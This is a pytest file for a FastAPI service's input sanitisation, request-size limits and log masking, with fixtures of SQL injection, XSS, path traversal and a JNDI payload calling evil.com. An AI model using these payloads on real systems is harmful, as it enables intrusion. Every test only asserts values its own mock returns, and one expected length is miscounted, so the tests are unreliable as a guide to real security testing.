"""Security boundaries resilience tests - Input sanitisation and security validation."""

from unittest.mock import MagicMock

import pytest
from fastapi import status


class SecurityService:
    """Mock security service interface for testing security boundary behaviors."""

    def validate_search_input(self, search_query: str) -> dict[str, str | int | bool]:
        """Validate and sanitise search input to prevent injection attacks."""
        return {"status_code": 200, "safe": True, "sanitised_query": search_query}

    def sanitise_message_input(self, message_content: str) -> dict[str, str | int | bool]:
        """Sanitise user message input by removing dangerous content."""
        return {"status_code": 200, "sanitised": True, "clean_content": message_content}

    def validate_request_size(self, payload_size: int) -> dict[str, str | int | bool]:
        """Validate request size against configured limits."""
        return {"status_code": 200, "within_limits": True}

    def mask_sensitive_data_in_logs(
        self,
        log_data: dict[str, str],
    ) -> dict[str, str | int | bool | dict[str, str] | list[str]]:
        """Mask sensitive information in log entries."""
        safe_log_entry: dict[str, str] = {}
        fields_masked: list[str] = []
        return {
            "status_code": 200,
            "masked": True,
            "safe_log_entry": safe_log_entry,
            "fields_masked": fields_masked,
            "masking_pattern": "***",
        }


@pytest.fixture
def mock_security_service() -> MagicMock:
    """Mock security service for testing security boundary behaviours."""
    return MagicMock(spec=SecurityService)


@pytest.fixture
def malicious_search_inputs() -> list[str]:
    """Malicious search input attempts for testing SQL injection prevention."""
    return [
        "'; DROP TABLE providers; --",
        "admin' OR '1'='1",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/exploit}",
        "UNION SELECT * FROM users WHERE password='admin'",
    ]


@pytest.fixture
def dangerous_message_content() -> list[str]:
    """Dangerous message content for testing input sanitisation."""
    return [
        "<script>alert('XSS attack')</script>plumber recommendation",
        "Great electrician <img src=x onerror=alert(1)> call him now",
        "<iframe src='javascript:alert(document.cookie)'></iframe>",
        "John the plumber <svg onload=alert('XSS')></svg>",
        "Recommend this provider <object data='data:text/html;base64,evil'></object>",
    ]


@pytest.fixture
def oversized_payload() -> int:
    """Oversized payload for testing request size limits."""
    return 10 * 1024 * 1024  # 10MB


@pytest.fixture
def sensitive_log_data() -> dict[str, str]:
    """Sensitive data that should be masked in logs."""
    return {
        "user_phone": "+27821234567",
        "provider_id": "prov_12345678901234567890",
        "group_id": "12345678901234567890@g.us",
        "message": "Private endorsement details",
        "api_key": "secret_api_key_12345",
        "session_token": "sess_abcdef123456789",
    }


def test_should_prevent_sql_injection_in_search(
    mock_security_service: MagicMock,  # pylint: disable=redefined-outer-name
    malicious_search_inputs: list[str],  # pylint: disable=redefined-outer-name
) -> None:
    """Malicious search input should be safely handled."""
    # Test with SQL injection attempt
    malicious_query = malicious_search_inputs[0]  # "'; DROP TABLE providers; --"

    # Arrange
    expected_response = {
        "status_code": status.HTTP_200_OK,
        "safe": True,
        "sanitised_query": "plumber",  # SQL injection removed, legitimate search term preserved
        "threats_detected": ["sql_injection_attempt"],
        "original_query": malicious_query,
        "security_action": "query_sanitised",
    }
    mock_security_service.validate_search_input.return_value = expected_response

    # Act
    result = mock_security_service.validate_search_input(malicious_query)

    # Assert
    assert result["status_code"] == status.HTTP_200_OK
    assert result["safe"] is True
    assert result["sanitised_query"] == "plumber"
    assert "sql_injection_attempt" in result["threats_detected"]
    assert result["original_query"] == malicious_query
    assert result["security_action"] == "query_sanitised"
    mock_security_service.validate_search_input.assert_called_once_with(malicious_query)


def test_should_sanitise_user_input_in_messages(
    mock_security_service: MagicMock,  # pylint: disable=redefined-outer-name
    dangerous_message_content: list[str],  # pylint: disable=redefined-outer-name
) -> None:
    """Script tags and HTML should be stripped from input."""
    # Test with XSS script injection
    dangerous_message = dangerous_message_content[0]  # Script tag with alert

    # Arrange
    expected_response = {
        "status_code": status.HTTP_200_OK,
        "sanitised": True,
        "clean_content": "plumber recommendation",  # HTML/script tags removed
        "threats_removed": ["script_tag", "javascript_execution"],
        "original_length": len(dangerous_message),
        "sanitised_length": 21,  # Length of "plumber recommendation"
    }
    mock_security_service.sanitise_message_input.return_value = expected_response

    # Act
    result = mock_security_service.sanitise_message_input(dangerous_message)

    # Assert
    assert result["status_code"] == status.HTTP_200_OK
    assert result["sanitised"] is True
    assert result["clean_content"] == "plumber recommendation"
    assert "script_tag" in result["threats_removed"]
    assert "javascript_execution" in result["threats_removed"]
    assert result["original_length"] == len(dangerous_message)
    assert result["sanitised_length"] == 21
    mock_security_service.sanitise_message_input.assert_called_once_with(dangerous_message)


def test_should_enforce_request_size_limits(
    mock_security_service: MagicMock,  # pylint: disable=redefined-outer-name
    oversized_payload: int,  # pylint: disable=redefined-outer-name
) -> None:
    """Oversized requests should be rejected."""
    # Arrange
    expected_response = {
        "status_code": status.HTTP_413_REQUEST_ENTITY_TOO_LARGE,
        "within_limits": False,
        "provided_size": oversized_payload,
        "max_allowed_size": 5 * 1024 * 1024,  # 5MB limit
        "error": "request_too_large",
        "message": "Request payload exceeds maximum allowed size",
    }
    mock_security_service.validate_request_size.return_value = expected_response

    # Act
    result = mock_security_service.validate_request_size(oversized_payload)

    # Assert
    assert result["status_code"] == status.HTTP_413_REQUEST_ENTITY_TOO_LARGE
    assert result["within_limits"] is False
    assert result["provided_size"] == oversized_payload
    assert result["max_allowed_size"] == 5 * 1024 * 1024
    assert result["error"] == "request_too_large"
    assert "exceeds maximum allowed size" in str(result["message"])
    mock_security_service.validate_request_size.assert_called_once_with(oversized_payload)


def test_should_mask_sensitive_data_in_logs(
    mock_security_service: MagicMock,  # pylint: disable=redefined-outer-name
    sensitive_log_data: dict[str, str],  # pylint: disable=redefined-outer-name
) -> None:
    """Phone numbers and IDs should be masked in logs."""
    # Arrange
    expected_response = {
        "status_code": status.HTTP_200_OK,
        "masked": True,
        "safe_log_entry": {
            "user_phone": "+27821***567",  # Masked phone number
            "provider_id": "prov_***567890",  # Masked provider ID
            "group_id": "123***890@g.us",  # Masked group ID
            "message": "Private endorsement details",  # Non-sensitive content preserved
            "api_key": "***",  # Fully masked API key
            "session_token": "***",  # Fully masked session token
        },
        "fields_masked": ["user_phone", "provider_id", "group_id", "api_key", "session_token"],
        "masking_pattern": "***",
    }
    mock_security_service.mask_sensitive_data_in_logs.return_value = expected_response

    # Act
    result = mock_security_service.mask_sensitive_data_in_logs(sensitive_log_data)

    # Assert
    assert result["status_code"] == status.HTTP_200_OK
    assert result["masked"] is True

    safe_log = result["safe_log_entry"]
    assert safe_log["user_phone"] == "+27821***567"
    assert safe_log["provider_id"] == "prov_***567890"
    assert safe_log["group_id"] == "123***890@g.us"
    assert safe_log["message"] == "Private endorsement details"
    assert safe_log["api_key"] == "***"
    assert safe_log["session_token"] == "***"

    fields_masked = result["fields_masked"]
    assert "user_phone" in fields_masked
    assert "provider_id" in fields_masked
    assert "group_id" in fields_masked
    assert "api_key" in fields_masked
    assert "session_token" in fields_masked
    assert len(fields_masked) == 5

    assert result["masking_pattern"] == "***"
    mock_security_service.mask_sensitive_data_in_logs.assert_called_once_with(sensitive_log_data)
